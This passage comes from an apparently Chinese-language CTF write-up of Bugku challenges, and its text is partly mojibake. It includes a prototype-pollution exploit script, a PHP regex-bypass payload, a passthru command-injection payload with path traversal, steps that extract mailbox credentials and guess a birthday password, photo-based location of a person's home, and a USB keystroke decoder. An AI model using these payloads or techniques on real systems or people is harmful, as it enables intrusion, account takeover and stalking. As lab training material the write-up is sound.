href=&quot;./reg&quot;&gt;æ³¨å†Œ&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;ä¼ å‚æœ‰è¯¯&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p>å‘ç°set-valueï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œpocåœ°å€ï¼š<code>https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</code><br>
<strong>poc:</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line">setFn(&#123;&#125;,<span class="string">&#x27;__proto__.p1&#x27;</span>,<span class="string">&quot;hacked&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.p1);</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿæºç </p>
<blockquote>
<p>1.å‘ç°è·¯ç”±&quot;/reg&quot;ä¼šåˆ›å»ºä¸€ä¸ªchallengerç”¨æˆ·å­—å…¸<br>
2.å‘ç°è·¯ç”±&quot;/update&quot;å¯ä»¥å¯¹challengerä¼ å‚é”®å€¼å¯¹ï¼ˆattrkeyå’Œattrvalï¼‰ï¼Œå¯¹challengerå­—å…¸ä¸­è¿›è¡Œä¿®æ”¹<br>
3.è·¯ç”±&quot;/getflag&quot;å¯ä»¥è·å–åˆ°flagï¼Œä½†å­˜åœ¨å‡ ä¸ªéªŒè¯ï¼Œé¦–å…ˆéœ€è¦ä¼ å‚ä¸¤ä¸ªå‚æ•°ï¼ˆkeyå’Œpasswordï¼‰è¿›æ¥ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·å­—å…¸ä¸­çš„å¹´é¾„è¿›è¡Œåˆ¤æ–­ï¼Œå¤§äº79ä¼šå¤±è´¥ï¼›å…¶æ¬¡Admin[key]éœ€è¦ç­‰äºpasswordï¼Œè€Œbody.passwordæ˜¯å¤šå°‘æˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„</p>
</blockquote>
<p>æ—¢ç„¶çŸ¥é“æ˜¯åŸå‹é“¾æ±¡æŸ“äº†ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨pocè‡ªå®šä¹‰ä¸€ä¸ªpasswordå³å¯ï¼Œè€Œå¯¹äºå¹´é¾„ï¼Œä»–æ˜¯å·²ç»å­˜åœ¨çš„å˜é‡ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥è¦†ç›–ageå˜é‡<br>
å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œç›¸å¯¹åº”çš„å‘é€è¯·æ±‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"># Dateï¼š2021/2/5 8:36</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11468&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;</span><br><span class="line">req = requests.session()</span><br><span class="line">test = req.get(url+<span class="string">&quot;/reg&quot;</span>)</span><br><span class="line">print(test.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;__proto__.pwd22&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;age&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="number">10</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/getflag&quot;</span>,json=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;pwd22&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/sodirty/LVKM00%7B%25M01%5B%40S~WPQLWU%7B2.png" alt=""></p>
<h3 id="ç¤¾å·¥-åˆæ­¥æ”¶é›†"><a class="header-anchor" href="#ç¤¾å·¥-åˆæ­¥æ”¶é›†">Â¶</a>ç¤¾å·¥-åˆæ­¥æ”¶é›†</h3>
<p>é¦–å…ˆæ‰“å¼€ç¯å¢ƒï¼Œåœ¨ç½‘ç«™æ‰¾åˆ°ä¸€ä¸ªä¸‹è½½é“¾æ¥ï¼Œå¼€å§‹ä¸‹è½½æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/KB%28S%60ML%28BU%7BR%4092OQPJVRA7.png" alt=""><br>
å¾—åˆ°ä¸€ä¸ªexeæ–‡ä»¶ï¼Œå¼€å§‹å°è¯•å‘é€ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/HW%40C~PFGC%5D%286AVT%7B~T%29K~%5DG.png" alt=""><br>
æç¤ºä¼šæ”¶é›†ä¿¡æ¯ï¼Œå¯èƒ½å­˜åœ¨é€šä¿¡ï¼Œæˆ‘ä»¬ä½¿ç”¨idaè¿›è¡ŒæŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/QZ%25G7T%40VNRO%7BAUA8%24M4Z_RI.png" alt=""><br>
å‘ç°å…³é”®ä¿¡æ¯ï¼Œè¿™é‡Œæœ‰è´¦å·å’Œå¯†ç ï¼Œè¿˜çœ‹åˆ°ä¸€ä¸ªsmtpåè®®ï¼ŒçŒœæµ‹è¿™ä¸ªå¯†ç æ˜¯æˆæƒç ï¼Œéœ€è¦é€šè¿‡smtpè¿›è¡Œç™»å½•ï¼Œå¾ˆå¤šå¸ˆå‚…éƒ½å¡åœ¨äº†è¿™ä¸€æ­¥ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯ç›´æ¥å»163é‚®ç®±çš„å®˜ç½‘é¡µé¢ç™»å½•ï¼Œå¯¼è‡´å…¶ä¸€ç›´ç™»å½•å¤±è´¥ã€‚æ­£ç¡®çš„åšæ³•æ˜¯æ‰¾ä¸€ä¸ªé‚®ä»¶å®¢æˆ·ç«¯æˆ–è€…Telnetè¿›è¡Œç™»å½•ã€‚<br>
è¿™é‡Œæˆ‘ä½¿ç”¨äº†Foxmailè¿›è¡Œç™»å½•ï¼Œé…ç½®å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä»–å®¢æˆ·ç«¯å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†å¤§åŒå°å¼‚<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/FP%28CSNJ%60F%5DEX%25FB%7DN%7DJTOFR.png" alt=""><br>
ç™»å½•æˆåŠŸåï¼Œå‘ç°æœ‰é‚®ä»¶ä¸»äººå’Œbugkuç®¡ç†å‘˜çš„é€šä¿¡å†…å®¹ï¼Œæå–å…³é”®ä¿¡æ¯ï¼Œæˆ‘ç”¨çº¢è‰²æ ‡æ³¨äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/7%5DB_%7B%40%25YW24%28INI_4A%5DM%60%405.png" alt=""><br>
çœ‹åˆ°é‚®ä»¶ä¸»äººidæ˜¯<strong>mara</strong>ï¼Œå‘é€çš„é‚®ä»¶æ—¥æœŸä¸º2021å¹´2æœˆ8æ—¥ï¼Œå¹¶ä¸”æ˜¯å‰ä¸¤å¤©åˆšè¿‡äº†ç”Ÿæ—¥ï¼Œè€Œä¸”è¿˜æœ‰ä¸€å¥â€œéƒ½äºŒåçš„äººäº†â€å…³é”®è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ€»ç»“æå–ä¿¡æ¯ï¼š</span><br><span class="line">ä¸»äººï¼šmara</span><br><span class="line">ç”Ÿæ—¥ï¼š20010206</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ‹¿idå’Œç”Ÿæ—¥å»å°è¯•åå°ç™»å½•ï¼Œå‘ç°ç”¨æˆ·åå°±æ˜¯maraï¼Œå¯†ç æ˜¯ç”Ÿæ—¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/075X%24_FK43RK80PFENV63XP.png" alt=""><br>
ç™»å½•æˆåŠŸåï¼Œç¿»äº†ä¸€ä¸‹å°±å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/VBM58Q%28%40%5DN%24%60PM%25%60QVTBHXD.png" alt=""></p>
<h3 id="ç¤¾å·¥-è¿›é˜¶æ”¶é›†"><a class="header-anchor" href="#ç¤¾å·¥-è¿›é˜¶æ”¶é›†">Â¶</a>ç¤¾å·¥-è¿›é˜¶æ”¶é›†</h3>
<p>å¼€å±€ä¸€å¼ å›¾<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/qq.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é€šè¿‡å›¾ç‰‡æå–ä¿¡æ¯ï¼š</span><br><span class="line">1.åœ°ç‚¹åœ¨å¤§é›å¡”</span><br><span class="line">2.å°ç¾ä»å®¶é‡Œå‡ºå‘ç»è¿‡äº†7ç«™ï¼Œå¹¶ä¸”å‡ºå‘çš„ç«™ç‚¹æ˜¯åœ°é“åˆå§‹ç«™</span><br><span class="line">3.å°ç¾å®¶ç¦»åˆå§‹ç«™æœ‰800ç±³å·¦å³ï¼Œç¦»ç¬¬å…­ç«™æœ‰1000ç±³ä»¥ä¸Šå·¦å³</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾äº†å¤§é›å¡”é™„è¿‘åœ°é“ç«™ï¼Œå‘ç°æœ‰ä¸€ç­åœ°é“å¯ä»¥åˆ°è¾¾å¤§é›å¡”ï¼Œå¹¶ä¸”åˆå§‹ç«™ç¦»å¤§é›å¡”æœ‰7ç«™<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/C%5DCN~859%29EZ6T5SV%29Q%40%25%40IH.png" alt=""><br>
ä¹Ÿå°±æ˜¯å°ç¾å®¶ç¦»èˆªå¤©åŸæœ‰1000å¤šç±³ï¼Œç¦»éŸ¦æ›²å—æœ‰800ç±³å·¦å³ï¼Œä¸¤ä¸ªåœ°ç‚¹ç”»åœ†æ‰¾äº¤ç‚¹å³å¯ï¼Œç»¼åˆå¾—åˆ°å°ç¾å®¶å°åŒºåå­—æ˜¯å…°ä¹”å›½é™…åŸ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;lanqiaoguojicheng&#125;</span><br></pre></td></tr></table></figure>
<h3 id="No-one-knows-regex-better-than-me"><a class="header-anchor" href="#No-one-knows-regex-better-than-me">Â¶</a>No one knows regex better than me</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$zero=$_REQUEST[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line">$first=$_REQUEST[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line">$second=$zero.$first;</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,$second))&#123;</span><br><span class="line">    $key=$second;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\.\.|flag/&quot;</span>,$key))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $third=$first;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,$third))&#123;</span><br><span class="line">            $end=substr($third,<span class="number">5</span>);</span><br><span class="line">            highlight_file(base64_decode($zero).$end);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ¥æ”¶<code>zero</code>å’Œ<code>first</code>å‚æ•°ï¼Œç¬¬ä¸€ä¸ªiféœ€è¦å¯¹ä¸¤ä¸ªå‚æ•°å†…å®¹çš„æ‹¼æ¥ç»“æœè¿›è¡ŒåŒ¹é…ï¼Œç¬¬äºŒä¸ªiféœ€è¦å¯¹<code>first</code>è¿›è¡ŒåŒ¹é…<br>
æœ€åæ˜¯ä¸€ä¸ªæ–‡ä»¶æ˜¾ç¤ºï¼Œå¹¶ä¸”æç¤ºflagåœ¨flag.phpï¼Œè€Œflag.phpç»è¿‡base64ç¼–ç åä¸º<code>ZmxhZy5waHA=</code>ï¼Œå…¶ä¸­åŒ…å«aï¼Œè¿‡äº†ç¬¬ä¸€ä¸ªæ­£åˆ™<br>
æ¥ä¸‹æ¥çœ‹ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ï¼ŒæŒ‰ç†è¯´è¿™é‡Œçš„æ­£åˆ™å†…å®¹åº”è¯¥æ˜¯åŒ¹é…<code>\</code>æˆ–è€…<code>.php</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/01%5DLS5CSW%29FR1D6%28R%249%7D8JJ.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/%5B5A90LBMULJ4F1%40W%608M3F1T.png" alt=""><br>
è¿™é‡Œæœ‰ä¸ªå°å‘ç‚¹ï¼Œè®©æˆ‘è€—äº†ç‚¹æ—¶é—´ï¼Œä¸ä¸€è¡€å¤±ä¹‹äº¤è‡‚ğŸ˜¢ï¼›è¿™é‡Œå› ä¸ºphpè§£é‡Šå™¨çš„é—®é¢˜ï¼Œç¬¬ä¸€ä¸ª<code>\</code>æŠŠç¬¬äºŒä¸ª<code>\</code>å®ä¹‰äº†ä¹‹åï¼Œæ¥ç€ç¬¬äºŒä¸ª<code>\</code>åˆè½¬ä¹‰äº†<code>|</code>ï¼Œç»“æœ<code>|</code>å˜æˆäº†å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†<br>
æ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?zero&#x3D;ZmxhZy5waHA&amp;first&#x3D;|.php</span><br></pre></td></tr></table></figure>
<h3 id="èªæ˜çš„php"><a class="header-anchor" href="#èªæ˜çš„php">Â¶</a>èªæ˜çš„php</h3>
<p>æ‰“å¼€é¡µé¢ï¼Œæç¤ºæˆ‘ä»¬ä¼ å…¥å‚æ•°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/V%7DA%7DJ%5D%256%24WOT%7BJQ%29%7BY%29C2%28Q.png" alt=""><br>
æˆ‘ä»¬éšä¾¿ä¼ ä¸ªaè¯•è¯•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/7V%2842VMA9_99B5%5DB%29Z0GK30.png" alt=""><br>
å›æ˜¾å‡ºä»£ç ï¼Œè¿™é‡Œbanäº†flagå­—ç¬¦ä¸²ï¼Œè¿˜banæ‰ä¸€äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½å›æ˜¾å‡ºphpinfo<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/8WDXG9UE307%29LUL4_10%7D~%7DG.png" alt=""><br>
å‘ç°å¯è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨<code>passthru()</code>å‡½æ•°æ¥é…åˆæ‰§è¡Œå‘½ä»¤<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/1U1H3H3O7_3S4FUDR%5B6T%25X4.png" alt=""><br>
å‘ç°å¯ç–‘çš„æ–‡ä»¶<code>_16634</code>ï¼Œè¯»å–ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/%5DE9MV%28NK%5B~%60%29_SKC5SHG3CC.png" alt=""><br>
å¾—åˆ°flagï¼Œæœ€ç»ˆpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;$&#123;passthru(&quot;tac ..&#x2F;..&#x2F;..&#x2F;_16634&quot;)&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a class="header-anchor" href="#Misc">Â¶</a>Misc</h2>
<h3 id="èŠ±ç‚¹æµé‡å¬å¬æ­Œ"><a class="header-anchor" href="#èŠ±ç‚¹æµé‡å¬å¬æ­Œ">Â¶</a>èŠ±ç‚¹æµé‡å¬å¬æ­Œ</h3>
<p>é¦–å…ˆä¸‹è½½æ–‡ä»¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å‡ºæ¥æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥ä¸¢åˆ°auä¸­æŸ¥çœ‹ä¸€ä¸‹ï¼ŒæŸ¥çœ‹é¢‘è°±å›¾<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/D2F%25%28%295~4%29CD_G96L%60E%5BH9H.png" alt=""><br>
å¾—çŸ¥ä¼šæœ‰ä¸€ä¸ªbeaufort-cipheråŠ å¯†ï¼Œé‚£æˆ‘ä»¬ç»§ç»­å‰è¿›ï¼Œå†æŠŠéŸ³é¢‘æ–‡ä»¶æ”¾è¿›010ä¸­æŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/LVB5TU62~%7DD_H%24%29AUXOKZFD.png" alt=""><br>
å‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸ª504b0304çš„åå…­è¿›åˆ¶å¼€å¤´ï¼Œè¿™æ˜¯zipæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨010ä¸­æ–°å»ºä¸€ä¸ª16è¿›åˆ¶æ–‡ä»¶ï¼ŒæŠŠä»504b0304å¼€å§‹çš„åé¢æ‰€æœ‰æ•°æ®å¤åˆ¶è¿‡æ¥åˆ°æ–°æ–‡ä»¶ä¸­ï¼Œå†ä¿å­˜ä¸ºnew.zip<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Y%25%5BD0R2T%40F%29S5CU1GOGR9%5BC.png" alt=""><br>
åŒæ—¶å†æ–‡ä»¶åº•éƒ¨å‘ç°è¿˜æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå‘ç°æ˜¯å¯†æ–‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/J8ZXQDN%40G9EF%5DW%5BA~HX%7BL_T.png" alt=""><br>
äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰¾è§£å¼€å¯†æ–‡çš„keyï¼Œè§£å‹æˆ‘ä»¬åˆšåˆšåˆšä¿å­˜çš„new.zipï¼Œå¾—åˆ°è¿™äº›æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Z%24O2AESR%5DW52XY6JSH0%24B%5DM.png" alt=""><br>
æ‰“å¼€æµé‡åŒ…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/6303OL0%5BT%25%40XD%5D%7D%40FHDU%29EL.png" alt=""><br>
å‘ç°å…¨æ˜¯usbçš„æµé‡ï¼Œé‚£æˆ‘ä»¬å»kaliå¯¼å‡ºä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r whereiskey.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/ZI%28%604I%29SK1%29AQ%284SP%28OR%2446.png" alt=""></p>
<blockquote>
<p>é”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬3ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usb packetï¼Œè¿™é‡Œä¸¤ä½ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€å…±8ä¸ªå­—èŠ‚æ˜æ˜¾æ˜¯é”®ç›˜æ•°æ®åŒ…</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VIS%5DLTNAT%24SQYS0F6~DDM%5BD.png" alt=""><br>
ä½¿ç”¨è„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span 